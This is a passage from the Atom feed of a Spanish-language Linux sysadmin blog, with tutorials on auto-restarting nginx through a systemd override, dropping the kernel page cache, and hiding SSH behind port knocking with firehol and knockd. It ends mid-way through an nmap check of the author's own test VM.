www-data   &lt;span class="m"&gt;663&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.1  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2456&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;664&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2456&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;665&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2456&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;666&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.1  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2456&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
root@server:~# &lt;span class="nb"&gt;kill&lt;/span&gt; &lt;span class="m"&gt;662&lt;/span&gt;
root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;691&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2220&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:41   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora necesitamos localizar el nombre de la &lt;strong&gt;unit&lt;/strong&gt; que se encarga de ese servicio, puesto que la carpeta de &lt;strong&gt;overrides&lt;/strong&gt; debe llamarse igual.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl list-units -a &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
  nginx.service    loaded    inactive dead    A high performance web server and a reverse proxy server
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como curiosidad, este fichero se encuentra en &lt;em&gt;/lib/systemd/system/&lt;/em&gt;, siguiendo las convenciones del empaquetado de &lt;em&gt;Debian&lt;/em&gt;. Alternativamente, podemos localizar los ficheros instalados por un paquete con el comando &lt;em&gt;dpkg -L nginx-light&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ls -lh /lib/systemd/system/nginx.service 
-rw-r--r-- &lt;span class="m"&gt;1&lt;/span&gt; root root &lt;span class="m"&gt;986&lt;/span&gt; dic  &lt;span class="m"&gt;1&lt;/span&gt;  &lt;span class="m"&gt;2014&lt;/span&gt; /lib/systemd/system/nginx.service
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En caso de ser una &lt;strong&gt;unit&lt;/strong&gt; escrita por nosotros, se encontraría en &lt;em&gt;/etc/systemd/system/&lt;/em&gt;. Esta es la convención:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;em&gt;/lib/systemd/system/&lt;/em&gt; &amp;rarr; &lt;strong&gt;units&lt;/strong&gt; de sistema, puestas por los paquetes instalados&lt;/li&gt;
&lt;li&gt;&lt;em&gt;/etc/systemd/system/&lt;/em&gt; &amp;rarr; &lt;strong&gt;units&lt;/strong&gt; o &lt;strong&gt;overrides&lt;/strong&gt; puestos por el usuario (nosotros)&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;Para añadir nuevas directivas (&lt;strong&gt;overrides&lt;/strong&gt;) a una &lt;strong&gt;unit&lt;/strong&gt; sin reescribirla entera, basta con crear una carpeta con su mismo nombre, concatenando &lt;strong&gt;.d&lt;/strong&gt;. Dentro podemos poner tantos ficheros &lt;em&gt;.conf&lt;/em&gt; como creamos necesarios, añadiendo las directivas que queramos añadir o modificar.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# mkdir /etc/systemd/system/nginx.service.d
root@server:~# cat /etc/systemd/system/nginx.service.d/autorestart.conf
&lt;span class="o"&gt;[&lt;/span&gt;Service&lt;span class="o"&gt;]&lt;/span&gt;
&lt;span class="nv"&gt;Restart&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;always
&lt;span class="nv"&gt;RestartSec&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;En este caso, se ha indicado que queremos un &lt;strong&gt;restart&lt;/strong&gt; siempre, sean cuales sean las circunstancias en las que se cayó el proceso, y que espere 1 segundo antes de intentarlo. Por como está hecho &lt;em&gt;systemd&lt;/em&gt;, &lt;strong&gt;no&lt;/strong&gt; va a levantar un servicio que hemos parado invocando el comando &lt;em&gt;systemctl&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para que los cambios en el fichero de configuración se apliquen es necesario recargar las configuraciones, indicando a &lt;em&gt;systemd&lt;/em&gt; que tienen que recargarlas.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# systemctl daemon-reload
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobación&lt;/h2&gt;
&lt;p&gt;Básicamente vamos a repetir el paso de la comprobación; se localiza el proceso &lt;strong&gt;master&lt;/strong&gt; y se finaliza (por ejemplo, con un &lt;strong&gt;SIGTERM&lt;/strong&gt; normal).&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;782&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2252&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;776&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.7   &lt;span class="m"&gt;6356&lt;/span&gt;  &lt;span class="m"&gt;1936&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00 nginx: master process /usr/sbin/nginx -g daemon on&lt;span class="p"&gt;;&lt;/span&gt; master_process on&lt;span class="p"&gt;;&lt;/span&gt;
www-data   &lt;span class="m"&gt;777&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2536&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;778&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2536&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;779&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2536&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;780&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2536&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
root@server:~# &lt;span class="nb"&gt;kill&lt;/span&gt; &lt;span class="m"&gt;776&lt;/span&gt;
root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;787&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2280&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Ahora solo hay que esperar el paso de los segundos configurados, y volver a ver si el servicio está corriendo; aunque en este esperé algo menos de lo configurado; la paciencia no es una de mis virtudes...&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;789&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2192&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;791&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.9   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2280&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root@server:~# ps faux &lt;span class="p"&gt;|&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;802&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.8   &lt;span class="m"&gt;4556&lt;/span&gt;  &lt;span class="m"&gt;2236&lt;/span&gt; pts/0    S+   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00          &lt;span class="se"&gt;\_&lt;/span&gt; grep nginx
root       &lt;span class="m"&gt;796&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;0&lt;/span&gt;.7   &lt;span class="m"&gt;6356&lt;/span&gt;  &lt;span class="m"&gt;1932&lt;/span&gt; ?        Ss   &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00 nginx: master process /usr/sbin/nginx -g daemon on&lt;span class="p"&gt;;&lt;/span&gt; master_process on&lt;span class="p"&gt;;&lt;/span&gt;
www-data   &lt;span class="m"&gt;797&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2592&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;798&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2592&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;799&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2592&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
www-data   &lt;span class="m"&gt;800&lt;/span&gt;  &lt;span class="m"&gt;0&lt;/span&gt;.0  &lt;span class="m"&gt;1&lt;/span&gt;.0   &lt;span class="m"&gt;6504&lt;/span&gt;  &lt;span class="m"&gt;2532&lt;/span&gt; ?        S    &lt;span class="m"&gt;11&lt;/span&gt;:56   &lt;span class="m"&gt;0&lt;/span&gt;:00  &lt;span class="se"&gt;\_&lt;/span&gt; nginx: worker process                           
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y con esto tenemos nuestro &lt;strong&gt;autorestart&lt;/strong&gt; para este servicio.&lt;/p&gt;</content><category term="linux"></category><category term="debian"></category><category term="jessie"></category><category term="systemd"></category><category term="nginx"></category></entry><entry><title>Liberando memoria caché</title><link href="http://www.linuxsysadmin.ml/2015/11/liberando-memoria-cache.html" rel="alternate"></link><published>2015-11-02T14:00:00+01:00</published><updated>2015-11-02T14:00:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-11-02:/2015/11/liberando-memoria-cache.html</id><summary type="html">&lt;p&gt;A veces nos encontramos que nuestro sistema linux parece tener la memoria &lt;em&gt;virtual&lt;/em&gt; ocupada, cuando no tenemos nada de memoria &lt;em&gt;RSS&lt;/em&gt;; esto no es un problema, ya que por la forma de funcionar del &lt;em&gt;memory manager&lt;/em&gt; de linux, se conserva "por si acaso" y se libera cuando realmente se necesita …&lt;/p&gt;</summary><content type="html">&lt;p&gt;A veces nos encontramos que nuestro sistema linux parece tener la memoria &lt;em&gt;virtual&lt;/em&gt; ocupada, cuando no tenemos nada de memoria &lt;em&gt;RSS&lt;/em&gt;; esto no es un problema, ya que por la forma de funcionar del &lt;em&gt;memory manager&lt;/em&gt; de linux, se conserva "por si acaso" y se libera cuando realmente se necesita.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ free -m
             total       used       free     shared    buffers     cached
Mem:          &lt;span class="m"&gt;3858&lt;/span&gt;       &lt;span class="m"&gt;3226&lt;/span&gt;        &lt;span class="m"&gt;632&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;        &lt;span class="m"&gt;114&lt;/span&gt;       &lt;span class="m"&gt;2545&lt;/span&gt;
-/+ buffers/cache:        &lt;span class="m"&gt;566&lt;/span&gt;       &lt;span class="m"&gt;3291&lt;/span&gt;
Swap:         &lt;span class="m"&gt;2381&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;2381&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Sin embargo este detalle nos puede resultar molesto y puede que queramos &lt;strong&gt;liberar&lt;/strong&gt; esa memoria de verdad, por ejemplo, para comparar memoria real ocupada por el sistema o sencillamente porque así lo queremos.&lt;/p&gt;
&lt;p&gt;En este caso no tenemos mas remedio que solicitar el &lt;em&gt;memory manager&lt;/em&gt; que la libere, escribiendo en el fichero de control habilitado para ello, de acuerdo a la &lt;a href="https://www.kernel.org/doc/Documentation/sysctl/vm.txt"&gt;documentación del &lt;em&gt;kernel&lt;/em&gt; de linux&lt;/a&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;drop_caches

Writing to this will cause the kernel to drop clean caches, as well as
reclaimable slab objects like dentries and inodes.  Once dropped, their
memory becomes free.

To free pagecache:
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;1&lt;/span&gt; &amp;gt; /proc/sys/vm/drop_caches
To free reclaimable slab objects &lt;span class="o"&gt;(&lt;/span&gt;includes dentries and inodes&lt;span class="o"&gt;)&lt;/span&gt;:
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;2&lt;/span&gt; &amp;gt; /proc/sys/vm/drop_caches
To free slab objects and pagecache:
    &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; &amp;gt; /proc/sys/vm/drop_caches

This is a non-destructive operation and will not free any dirty objects.
To increase the number of objects freed by this operation, the user may run
&lt;span class="sb"&gt;`&lt;/span&gt;sync&lt;span class="err"&gt;&amp;#39;&lt;/span&gt; prior to writing to /proc/sys/vm/drop_caches.  This will minimize the
number of dirty objects on the system and create more candidates to be
dropped.
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Este fichero viene por defecto con permisos de escritura solamente para el usuario &lt;strong&gt;root&lt;/strong&gt; y no se puede escribir sin el mismo. Como no queremos trabajar con el usuario &lt;strong&gt;root&lt;/strong&gt;, vamos a usar el comando &lt;em&gt;sudo&lt;/em&gt; con un usuario normal:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ sudo bash -c &lt;span class="s2"&gt;&amp;quot;echo 3 &amp;gt; /proc/sys/vm/drop_caches&amp;quot;&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Alternativamente, podemos utilizar el comando &lt;em&gt;tee&lt;/em&gt; para realizar la misma operación, sin el envoltorio de &lt;em&gt;bash&lt;/em&gt;:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ &lt;span class="nb"&gt;echo&lt;/span&gt; &lt;span class="m"&gt;3&lt;/span&gt; &lt;span class="p"&gt;|&lt;/span&gt; sudo tee /proc/sys/vm/drop_caches
&lt;span class="m"&gt;3&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Y finalmente nuestra memoria queda vacía de todo aquello que no era indispensable para la ejecución del sistema.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@desktop:~$ free -m
             total       used       free     shared    buffers     cached
Mem:          &lt;span class="m"&gt;3858&lt;/span&gt;        &lt;span class="m"&gt;752&lt;/span&gt;       &lt;span class="m"&gt;3105&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;          &lt;span class="m"&gt;2&lt;/span&gt;        &lt;span class="m"&gt;207&lt;/span&gt;
-/+ buffers/cache:        &lt;span class="m"&gt;542&lt;/span&gt;       &lt;span class="m"&gt;3315&lt;/span&gt;
Swap:         &lt;span class="m"&gt;2381&lt;/span&gt;          &lt;span class="m"&gt;0&lt;/span&gt;       &lt;span class="m"&gt;2381&lt;/span&gt;
gerard@desktop:~$ 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;¡Acabamos de liberar 2 gigabytes de memoria!&lt;/p&gt;
&lt;p&gt;&lt;strong&gt;CUIDADO&lt;/strong&gt;: Esta operación puede afectar el rendimiento puntual del sistema, ya que en caso de volver a necesitar la información &lt;em&gt;cacheada&lt;/em&gt;, deberá volver a recargar la memoria, probablemente desde disco.&lt;/p&gt;</content><category term="linux"></category><category term="kernel"></category><category term="memory manager"></category><category term="drop caches"></category></entry><entry><title>Ocultando puertos con port knocking</title><link href="http://www.linuxsysadmin.ml/2015/10/ocultando-puertos-con-port-knocking.html" rel="alternate"></link><published>2015-10-29T11:30:00+01:00</published><updated>2015-10-29T11:30:00+01:00</updated><author><name>Gerard</name></author><id>tag:www.linuxsysadmin.ml,2015-10-29:/2015/10/ocultando-puertos-con-port-knocking.html</id><summary type="html">&lt;p&gt;En este artículo vamos a enseñar como ocultar un puerto tras el firewall, de forma que solamente se abra tras utilizar el protocolo &lt;em&gt;port knocking&lt;/em&gt;. Las tecnologías usadas van a ser &lt;em&gt;firehol&lt;/em&gt; como firewall y el demonio &lt;em&gt;knockd&lt;/em&gt; ocultando el &lt;em&gt;SSH&lt;/em&gt;, aunque vamos a permitir acceder al puerto de HTTP …&lt;/p&gt;</summary><content type="html">&lt;p&gt;En este artículo vamos a enseñar como ocultar un puerto tras el firewall, de forma que solamente se abra tras utilizar el protocolo &lt;em&gt;port knocking&lt;/em&gt;. Las tecnologías usadas van a ser &lt;em&gt;firehol&lt;/em&gt; como firewall y el demonio &lt;em&gt;knockd&lt;/em&gt; ocultando el &lt;em&gt;SSH&lt;/em&gt;, aunque vamos a permitir acceder al puerto de HTTP.&lt;/p&gt;
&lt;p&gt;El protocolo de &lt;em&gt;port knocking&lt;/em&gt; es un sistema en el que para abrir la conectividad en un puerto se debe primero abrir una secuencia concreta a otros puertos, sean &lt;em&gt;TCP&lt;/em&gt; o &lt;em&gt;UDP&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Para conseguir este objetivo, se van a usar las siguientes tecnologías:&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;Debian jessie&lt;/strong&gt;: Como distribución base; podría ser cualquier otra&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Firehol&lt;/strong&gt;: Scripts para levantar un firewall basado en &lt;em&gt;iptables&lt;/em&gt;&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;El hardware va a ser uno con capacidades limitadas, virtualizado en VirtualBox.&lt;/p&gt;
&lt;ul&gt;
&lt;li&gt;&lt;strong&gt;CPUs&lt;/strong&gt;: 1&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Memoria&lt;/strong&gt;: 256 Mb&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Disco&lt;/strong&gt;: 2 Gb&lt;/li&gt;
&lt;li&gt;&lt;strong&gt;Red&lt;/strong&gt;: 1 interfaz (&lt;em&gt;eth0&lt;/em&gt;) &lt;em&gt;host-only&lt;/em&gt; o &lt;em&gt;bridged&lt;/em&gt; con IP fija&lt;/li&gt;
&lt;/ul&gt;
&lt;p&gt;La instalación base es una &lt;em&gt;Debian&lt;/em&gt; mínima instalada con el CD netinstall, con todo desmarcado y con el servidor de &lt;em&gt;SSH&lt;/em&gt; previamente instalado.&lt;/p&gt;
&lt;h2&gt;Instalación del servidor&lt;/h2&gt;
&lt;p&gt;Para empezar, vamos a instalar los dos servicios implicados:&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# apt-get install firehol knockd
...
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Configuramos las reglas del firewall, de acuerdo a la documentación relacionada con &lt;em&gt;port knocking&lt;/em&gt;. Se define un nivel de protección máximo, ya que se trata de la interfaz que deberá estar accesible desde internet; esto nos evita la mayoría de ataques conocidos en la capa 3 y 4.&lt;/p&gt;
&lt;p&gt;En cuanto a las conectividad, vamos a permitir que este servidor acceda a servicios &lt;em&gt;DNS&lt;/em&gt; y &lt;em&gt;HTTP&lt;/em&gt;, que es lo justo para actualizarse. Como servidor vamos a permitir el acceso a &lt;em&gt;HTTP&lt;/em&gt; (ya que en el ejemplo, esta máquina va a servir como servidor &lt;em&gt;HTTP&lt;/em&gt;) y a &lt;em&gt;SSH&lt;/em&gt; siempre y cuando se cumpla con el protocolo de seguridad.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/firehol/firehol.conf 
version &lt;span class="m"&gt;5&lt;/span&gt;

interface any world
    protection strong
    client &lt;span class="s2"&gt;&amp;quot;dns http&amp;quot;&lt;/span&gt; accept
    server http accept
    server ssh accept with knock hidden
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Acto seguido vamos a definir las reglas para que se abra el &lt;em&gt;knock hidden&lt;/em&gt; (que corresponde con el puerto &lt;em&gt;SSH&lt;/em&gt;) si se completa la secuencia de &lt;em&gt;knock&lt;/em&gt;. En este caso concreto, se indica una secuencia de los puertos &lt;em&gt;TCP&lt;/em&gt; 123, 456 y 789; aunque es posible definir puertos &lt;em&gt;UDP&lt;/em&gt;, dejamos sin indicarlo, que nos los va a definir como &lt;em&gt;TCP&lt;/em&gt;.&lt;/p&gt;
&lt;p&gt;Como medida de seguridad vamos a indicar un tiempo máximo de 10 segundos para completar la secuencia de &lt;em&gt;knock&lt;/em&gt; y un autocierre del puerto a los 5 segundos (aunque firehol va a permitir las conexiones que se hayan establecido en esos 5 segundos).&lt;/p&gt;
&lt;p&gt;Es especialmente interesante ver que la regla incluye la dirección origen, con lo que la apertura de puerto solo será visible desde la máquina que completó la secuencia de &lt;em&gt;knock&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/knockd.conf 
&lt;span class="o"&gt;[&lt;/span&gt;options&lt;span class="o"&gt;]&lt;/span&gt;
    UseSyslog

&lt;span class="o"&gt;[&lt;/span&gt;SSH&lt;span class="o"&gt;]&lt;/span&gt;
    &lt;span class="nv"&gt;sequence&lt;/span&gt;      &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;123&lt;/span&gt;,456,789
    &lt;span class="nv"&gt;seq_timeout&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;10&lt;/span&gt;
    &lt;span class="nv"&gt;start_command&lt;/span&gt; &lt;span class="o"&gt;=&lt;/span&gt; iptables -A knock_hidden -s %IP% -j ACCEPT
    &lt;span class="nv"&gt;cmd_timeout&lt;/span&gt;   &lt;span class="o"&gt;=&lt;/span&gt; &lt;span class="m"&gt;5&lt;/span&gt;
    &lt;span class="nv"&gt;stop_command&lt;/span&gt;  &lt;span class="o"&gt;=&lt;/span&gt; iptables -D knock_hidden -s %IP% -j ACCEPT
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Como medida de seguridad, &lt;em&gt;Debian&lt;/em&gt; tiene una protección para levantar ambos servicios, así que tenemos que indicarle que queremos que se puedan levantar, editando otros ficheros de configuración.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# cat /etc/default/knockd 
...
&lt;span class="nv"&gt;START_KNOCKD&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;&lt;span class="m"&gt;1&lt;/span&gt;
...
root@server:~# cat /etc/default/firehol 
...
&lt;span class="nv"&gt;START_FIREHOL&lt;/span&gt;&lt;span class="o"&gt;=&lt;/span&gt;YES
...
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;p&gt;Finalmente podemos levantar los servicios de &lt;em&gt;port knocking&lt;/em&gt; y de &lt;em&gt;firewall&lt;/em&gt;, usando las herramientas estándares que nos ofrece la distribución.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;root@server:~# service knockd restart
root@server:~# service firehol restart
root@server:~# 
&lt;/pre&gt;&lt;/div&gt;


&lt;h2&gt;Comprobación de funcionamiento&lt;/h2&gt;
&lt;p&gt;Para comprobar el funcionamiento basta con comprobar que el puerto está normalmente cerrado. Personalmente he usado &lt;em&gt;nmap&lt;/em&gt;, aunque se podría usar &lt;em&gt;netcat&lt;/em&gt; o &lt;em&gt;telnet&lt;/em&gt;.&lt;/p&gt;
&lt;div class="highlight"&gt;&lt;pre&gt;&lt;span&gt;&lt;/span&gt;gerard@workstation:~$ nmap -PN &lt;span class="m"&gt;192&lt;/span&gt;.168.56.3 -p &lt;span class="m"&gt;22&lt;/span&gt;

Starting Nmap &lt;span class="m"&gt;5&lt;/span&gt;.21 &lt;span class="o"&gt;(&lt;/span&gt; http://nmap.org &lt;span class="o"&gt;)&lt;/span&gt; at &lt;span class="m"&gt;2015&lt;/span&gt;-10-28 &lt;span class="m"&gt;17&lt;/span&gt;:33 CET
